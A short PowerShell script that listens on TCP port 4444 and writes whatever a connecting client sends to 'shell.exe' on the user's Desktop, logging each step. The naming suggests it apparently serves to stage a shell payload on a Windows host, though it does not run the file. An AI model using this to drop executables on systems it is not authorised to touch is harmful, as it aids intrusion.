$listener = New-Object System.Net.Sockets.TcpListener(4444)
$listener.Start()
Write-Host "Listener started"

$client = $listener.AcceptTcpClient()
Write-Host "Client connected"

$stream = $client.GetStream()
$fileStream = [System.IO.File]::OpenWrite("C:\Users\$env:USERNAME\Desktop\shell.exe")
Write-Host "File stream opened"

$buffer = New-Object System.Byte[] 1024
while (($read = $stream.Read($buffer, 0, 1024)) -gt 0) {
    $fileStream.Write($buffer, 0, $read)
    Write-Host "Received $read bytes"
}

$fileStream.Close()
Write-Host "File stream closed"

$stream.Close()
Write-Host "Network stream closed"

$client.Close()
Write-Host "Client connection closed"

$listener.Stop()
Write-Host "Listener stopped"